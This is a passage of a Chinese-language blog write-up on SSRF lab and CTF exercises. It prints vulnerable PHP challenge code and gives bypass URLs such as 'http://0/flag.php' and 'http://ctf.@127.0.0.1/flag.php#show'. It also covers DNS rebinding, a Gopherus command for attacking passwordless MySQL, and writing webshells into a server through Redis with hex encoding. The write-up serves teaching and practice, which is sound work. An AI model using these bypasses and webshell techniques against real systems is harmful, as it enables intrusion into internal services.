class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这个的话要求<code>host</code>长度小于5，这个时候127.0.0.1和localhost都是不符合要求的，这个时候我们可以用特殊0来替代</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">url<span class=\"token operator\">=</span>http<span class=\"token operator\">:</span><span class=\"token comment\">//0/flag.php</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>还有一个，<code>127.1</code>也是可行的<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150832.png\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"0X03\"><a href=\"#0X03\" class=\"headerlink\" title=\"0X03\"></a>0X03</h4><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$url</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$x</span><span class=\"token operator\">=</span><span class=\"token function\">parse_url</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'scheme'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">===</span><span class=\"token string single-quoted-string\">'http'</span><span class=\"token operator\">||</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'scheme'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">===</span><span class=\"token string single-quoted-string\">'https'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$ip</span> <span class=\"token operator\">=</span> <span class=\"token function\">gethostbyname</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'host'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;/br>'</span><span class=\"token operator\">.</span><span class=\"token variable\">$ip</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;/br>'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">filter_var</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ip</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">FILTER_VALIDATE_IP</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">FILTER_FLAG_NO_PRIV_RANGE</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">FILTER_FLAG_NO_RES_RANGE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'ip!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'scheme'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">FILTER_VALIDATE_IP 要求值是合法的 IP\nFILTER_FLAG_NO_PRIV_RANGE 要求值是 RFC 指定的私域 IP （比如 <span class=\"token number\">192.168</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span>）\nFILTER_FLAG_NO_RES_RANGE 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>这里的话其实就是要求用一个公网ip，不能用私网ip<br>这里的话可以用<a href=\"https://lock.cmpxchg8b.com/rebinder.html\">https://lock.cmpxchg8b.com/rebinder.html</a>来构造DNS重绑定<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150826.png\" alt=\"在这里插入图片描述\"><br>然后作为host赋值给url即可<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150885.png\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"0X04\"><a href=\"#0X04\" class=\"headerlink\" title=\"0X04\"></a>0X04</h4><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$url</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$x</span><span class=\"token operator\">=</span><span class=\"token function\">parse_url</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^http:\\/\\/ctf\\..*show$/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以看到的话就是这里要求http开头，中间是<code>.ctf</code>，然后中间可以写内容，最后以show结尾<br>这个时候我们就可以利用刚刚的思路，来构造url</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">url<span class=\"token operator\">=</span>http<span class=\"token operator\">:</span><span class=\"token comment\">//ctf.@127.0.0.1/flag.php#show</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150219.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"Gopher协议实战\"><a href=\"#Gopher协议实战\" class=\"headerlink\" title=\"Gopher协议实战\"></a>Gopher协议实战</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>打无密码的mysql</p></blockquote>\n<p>进入靶场是一个登录界面<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150516.png\" alt=\"在这里插入图片描述\"></p>\n<p>提示了是无密码的mysql，那就尝试利用gopher工具来打</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">python2 gopherus<span class=\"token punctuation\">.</span>py <span class=\"token operator\">--</span>exploit mysql<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>用户名为root，内容为一句话木马即可<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150656.png\" alt=\"在这里插入图片描述\"><br>而后我们看这道题<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150318.png\" alt=\"在这里插入图片描述\"><br>源代码中的returl应该就是突破口，我们随便输入一个进入check.php界面，此时将刚刚得到的payload进行url编码后赋值给returl即可,此时访问1.php<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150377.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150454.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"绝对路径写webshell实战\"><a href=\"#绝对路径写webshell实战\" class=\"headerlink\" title=\"绝对路径写webshell实战\"></a>绝对路径写webshell实战</h3><p>题目提示</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>打redis</p></blockquote>\n<p>代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$url</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$ch</span><span class=\"token operator\">=</span><span class=\"token function\">curl_init</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_HEADER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_RETURNTRANSFER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">curl_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">curl_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>提示了打redis，那思路就比较明显了，可以利用工具打然后直接赋值，这里手动操作一下</p>\n<p>设置本地数据库存放目录<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150895.png\" alt=\"在这里插入图片描述\"><br>写一句话木马<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150906.png\" alt=\"在这里插入图片描述\"><br>但此时的回显不是ok，说明可能被过滤了，这里换成十六进制绕过<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150932.png\" alt=\"在这里插入图片描述\"><br>设置文件名<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150101.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150218.png\" alt=\"在这里插入图片描述\"><br>访问<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150734.png\" alt=\"在这里插入图片描述\"><br>获取flag<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150755.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p>《从0到1 CTFer成长之路》<br><a href=\"https://xz.aliyun.com/t/7333#toc-0\">https://xz.aliyun.com/t/7333#toc-0</a><br><a href=\"https://xz.aliyun.com/t/5665#toc-0\">https://xz.aliyun.com/t/5665#toc-0</a><br><a href=\"https://cloud.tencent.com/developer/article/1437452\">https://cloud.tencent.com/developer/article/1437452</a><br><a href=\"https://www.cnblogs.com/wjrblogs/p/14456190.html\">https://www.cnblogs.com/wjrblogs/p/14456190.html</a><br><a href=\"https://www.cnblogs.com/bmjoker/p/9548962.html\">https://www.cnblogs.com/bmjoker/p/9548962.html</a><br><a href=\"https://www.freebuf.com/articles/web/333318.html\">https://www.freebuf.com/articles/web/333318.html</a><br><a href=\"https://drun1baby.github.io/2022/05/16/SSRF-Lab%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/\">SSRF-Lab环境搭建</a></p>\n","feature":true,"text":"声明文章首发于跳跳糖社区https://tttang.com/archive/1648/ 前言SSRF之前只有简单了解，进行二次学习后简单总结一下，希望能对正在学习SSRF的师傅们有所帮助 漏洞相关信息漏洞成因SSRF 形成的原因往往是由于服务端提供了从其他服务器应用获取数据的功...","link":"","photos":[],"count_time":{"symbolsCount":"20k","symbolsTime":"19 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"SSRF","slug":"SSRF","count":1,"path":"api/tags/SSRF.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%A3%B0%E6%98%8E\"><span class=\"toc-text\">声明</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">漏洞相关信息</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0\"><span class=\"toc-text\">漏洞成因</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%AE%9A%E4%B9%89\"><span class=\"toc-text\">漏洞定义</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3\"><span class=\"toc-text\">漏洞危害</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%89%80%E6%B6%89%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">所涉函数</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#curl-exec\"><span class=\"toc-text\">curl_exec()</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#file-get-contents\"><span class=\"toc-text\">file_get_contents()</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#fsockopen\"><span class=\"toc-text\">fsockopen()</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%89%80%E6%B6%89%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">所涉协议</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#file%E4%BC%AA%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">file伪协议</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Gopher%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">Gopher协议</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#dict%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">dict协议</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#RESP%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">RESP协议</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF\"><span class=\"toc-text\">常见绕过姿势</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#URL-and-IP-PASS\"><span class=\"toc-text\">URL and IP PASS</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#302%E8%B7%B3%E8%BD%AC\"><span class=\"toc-text\">302跳转</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%B7%BB%E5%8A%A0-%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">添加@绕过</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%89%B9%E6%AE%8A%E6%95%B0%E5%AD%97%EF%BC%88%E4%BE%8B%E5%A6%82%E2%91%A1%EF%BC%89\"><span class=\"toc-text\">特殊数字（例如②）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8F%A5%E5%8F%B7%E6%9B%BF%E4%BB%A3-%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">句号替代.绕过</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%9C%81%E7%95%A50\"><span class=\"toc-text\">省略0</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2\"><span class=\"toc-text\">进制转换</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%89%B9%E6%AE%8A0\"><span class=\"toc-text\">特殊0</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#DNS%E9%87%8D%E7%BB%91%E5%AE%9A\"><span class=\"toc-text\">DNS重绑定</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Redis%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E5%A7%BF%E5%8A%BF\"><span class=\"toc-text\">Redis常见攻击姿势</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E5%86%99webshell\"><span class=\"toc-text\">绝对路径写webshell</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%BB%93%E5%90%88SSRF\"><span class=\"toc-text\">结合SSRF</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%86%99ssh%E5%85%AC%E9%92%A5\"><span class=\"toc-text\">写ssh公钥</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%BB%93%E5%90%88SSRF-1\"><span class=\"toc-text\">结合SSRF</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%86%99contrab%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">写contrab计划任务反弹shell</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%BB%93%E5%90%88SSRF-2\"><span class=\"toc-text\">结合SSRF</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">靶场实战</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SSRF-lab\"><span class=\"toc-text\">SSRF-lab</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA\"><span class=\"toc-text\">环境搭建</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">收集信息</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9E%84%E9%80%A0webshell\"><span class=\"toc-text\">构造webshell</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98-1\"><span class=\"toc-text\">靶场实战</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#URL-and-IP-PASS-1\"><span class=\"toc-text\">URL and IP PASS</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#0X01\"><span class=\"toc-text\">0X01</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#0X02\"><span class=\"toc-text\">0X02</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#0X03\"><span class=\"toc-text\">0X03</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#0X04\"><span class=\"toc-text\">0X04</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Gopher%E5%8D%8F%E8%AE%AE%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">Gopher协议实战</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E5%86%99webshell%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">绝对路径写webshell实战</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE\"><span class=\"toc-text\">参考文献</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"浅析SQL注入漏洞","uid":"b249936ad8b44b9df7ce04e2f671a839","slug":"浅析sql注入漏洞","date":"2022-07-04T13:31:20.000Z","updated":"2024-02-14T07:47:58.000Z","comments":true,"path":"api/articles/浅析sql注入漏洞.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141544686.png","text":"前言在sqli-labs靶场中学过一点sql注入，最近遇到了很多此类题目，对sql注入进行了进一步的学习，汇总如下，希望能对正在学习的各位师傅们有所帮助 漏洞相关信息漏洞成因程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。 定义web应用程序对用户输入数据的合法性没有判断...","link":"","photos":[],"count_time":{"symbolsCount":"29k","symbolsTime":"27 